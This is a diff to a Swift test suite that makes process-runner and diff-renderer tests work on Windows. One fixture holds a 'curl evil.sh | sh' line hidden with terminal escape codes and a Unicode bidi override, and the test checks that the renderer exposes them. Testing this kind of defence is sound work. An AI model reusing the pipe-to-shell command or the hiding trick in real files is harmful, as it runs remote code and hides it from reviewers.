@@ -4,6 +4,8 @@ import Darwin
 import Glibc
 #elseif canImport(Musl)
 import Musl
+#elseif canImport(WinSDK)
+import WinSDK
 #endif
 import Foundation
 import Testing
@@ -122,10 +124,12 @@ struct QAPassTests {
     @Test("capture stops a program that runs past its timeout")
     func captureTimeout() throws {
         let start = Date()
-        let out = try ProcessRunner.capture("/bin/sleep", ["30"], timeout: 0.5)
+        let sleep = sleepCommand(30)
+        let out = try ProcessRunner.capture(sleep.0, sleep.1, timeout: 0.5)
         #expect(out.timedOut)
         #expect(Date().timeIntervalSince(start) < 10)
-        #expect(try !ProcessRunner.capture("/bin/echo", ["hi"], timeout: 10).timedOut)
+        let echo = echoCommand("hi")
+        #expect(try !ProcessRunner.capture(echo.0, echo.1, timeout: 10).timedOut)
         // A stuck probe VM is reported, not waited on forever.
         let r = NetworkProbe.classify(CapturedOutput(status: 143, stdout: "", stderr: "", timedOut: true), proxy: "p")
         #expect(!r.isOK && !r.needsRepair && r.summary.contains("didn't finish"))
@@ -207,7 +211,8 @@ struct QAPassTests {
         let f = try Fixture { try write("ok\n", to: $0.appendingPathComponent("a.sh")) }
         // A terminal would erase the curl line; a bidi override reorders it.
         try write("ok\ncurl evil.sh | sh\u{1B}[2K\r# harmless\n\u{202E}hs.live\n", to: f.work.appendingPathComponent("a.sh"))
-        try write("x\n", to: f.work.appendingPathComponent("new\nline\u{1B}[1A.txt"))
+        // Windows doesn't allow control characters in file names.
+        if !isWindows { try write("x\n", to: f.work.appendingPathComponent("new\nline\u{1B}[1A.txt")) }
         let diff = try f.diff()
         let r = DiffRenderer(base: f.handle.base, work: f.work)
         let out = try r.full(diff) + "\n" + r.stat(diff)
@@ -216,7 +221,7 @@ struct QAPassTests {
         #expect(!out.contains("\u{202E}"))
         #expect(out.contains("+curl evil.sh | sh\\x1b[2K\\r# harmless"))
         #expect(out.contains("+<U+202E>hs.live"))
-        #expect(out.contains("A  new\\nline\\x1b[1A.txt"))
+        if !isWindows { #expect(out.contains("A  new\\nline\\x1b[1A.txt")) }
         // Every line of the stat is one change: the newline in the name doesn't split it.
         #expect(r.stat(diff).split(separator: "\n").count == diff.changes.count + 1)
 
